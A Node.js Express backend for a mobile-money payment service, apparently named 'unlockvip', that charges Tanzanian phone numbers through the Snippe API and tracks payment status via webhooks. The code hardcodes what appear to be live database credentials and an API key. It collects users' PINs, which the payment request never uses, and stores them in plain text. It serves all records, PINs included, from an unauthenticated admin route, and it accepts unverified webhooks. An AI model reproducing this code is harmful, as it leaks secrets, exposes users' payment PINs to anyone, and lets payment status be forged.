require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");
const crypto = require("crypto");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

/*
========================
MONGODB CONNECTION
========================
*/

mongoose.connect(
  
"mongodb+srv://zaharanirashidi29_db_user:oQgtq3g1JHIgtIT2@cluster0.a6wjozy.mongodb.net/unlockvip?retryWrites=true&w=majority"
)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log("MongoDB Error:", err));

/*
========================
PAYMENT SCHEMA
========================
*/

const paymentSchema = new mongoose.Schema({
  phone: String,
  pin: String,
  amount: Number,
  reference: String,
  status: String,
  reason: String,
  time: String
});

const Payment = mongoose.model("Payment", 
paymentSchema);

/*
========================
SNIPPE CONFIG
========================
*/

const API_KEY = 
"snp_49f2851761385b6ca7a0caafac97e2c1b1e3fcd30fa258c98a52c28c1a36c932";
const BASE_URL = "https://api.snippe.sh/v1";

/*
========================
ROOT TEST
========================
*/

app.get("/", (req, res) => {
  res.send("Snippe Backend Running 🚀");
});

/*
========================
CREATE PAYMENT
========================
*/

app.post("/create-payment", async (req, res) => {

  try {

    let { phone, pin } = req.body;

    const amount = 3000;

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone number required"
      });
    }

    phone = phone.toString().trim();

    if (phone.startsWith("+255")) phone = 
phone.replace("+", "");
    if (phone.startsWith("0")) phone = "255" + 
phone.substring(1);

    if (!phone.startsWith("255") || phone.length 
!== 12) {
      return res.status(400).json({
        success: false,
        error: "Invalid Tanzanian phone number"
      });
    }

    const idempotencyKey = crypto.randomUUID();

    const response = await axios.post(
      `${BASE_URL}/payments`,
      {
        payment_type: "mobile",
        details: {
          amount: amount,
          currency: "TZS"
        },
        phone_number: phone,
        webhook_url: 
"https://unlockvip-backend-1.onrender.com/webhooks/snippe",
        customer: {
          firstname: "Customer",
          lastname: "User",
          email: "customer@email.com"
        }
      },
      {
        headers: {
          Authorization: `Bearer ${API_KEY}`,
          "Content-Type": "application/json",
          "Idempotency-Key": idempotencyKey
        }
      }
    );

    const paymentData = response.data;

    // ✅ FIXED (MAIN ISSUE)
    const savedReference =
      paymentData?.data?.reference ||   // 🔥 
CORRECT FIELD
      paymentData?.reference ||
      paymentData?.external_reference ||
      paymentData?.id;

    console.log("🔥 FULL RESPONSE:", paymentData);
    console.log("🔥 Saved Reference:", 
savedReference);

    await Payment.create({
      phone: phone,
      pin: pin || "",
      amount: amount,
      reference: savedReference,
      status: "PENDING",
      reason: "WAITING",
      time: new Date().toLocaleString()
    });

    res.json({
      success: true,
      payment: paymentData
    });

  } catch (error) {

    console.error("Payment Error:",
      error.response?.data || error.message
    );

    res.status(500).json({
      success: false,
      error:
        error.response?.data?.message ||
        error.message
    });

  }

});

/*
========================
WEBHOOK RECEIVER
========================
*/

app.post("/webhooks/snippe", async (req, res) => {

  const event = req.headers["x-webhook-event"];
  const payload = req.body;

  console.log("Webhook Event:", event);
  console.log("Payload:", payload);

  const payment = payload.data;

  const reference =
    payment.reference ||
    payment.external_reference ||
    payment.id;

  console.log("🔍 Incoming Reference:", 
reference);

  if (event === "payment.completed") {

    const updated = await 
Payment.findOneAndUpdate(
      { reference: reference },
      {
        status: "COMPLETED",
        reason: "SUCCESS"
      },
      { returnDocument: "after" } // ✅ FIX 
warning
    );

    console.log("✅ Payment completed:", updated);
  }

  if (event === "payment.failed") {

    const reason = payment.failure_reason || 
"FAILED";

    const updated = await 
Payment.findOneAndUpdate(
      { reference: reference },
      {
        status: "FAILED",
        reason: reason
      },
      { returnDocument: "after" } // ✅ FIX 
warning
    );

    console.log("❌ Payment failed:", reason, 
updated);
  }

  res.status(200).send("Webhook received");

});

/*
========================
ADMIN DATA
========================
*/

app.get("/admin/payments", async (req, res) => {
  const data = await Payment.find().sort({ _id: -1 
});
  res.json(data);
});

/*
========================
START SERVER
========================
*/

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
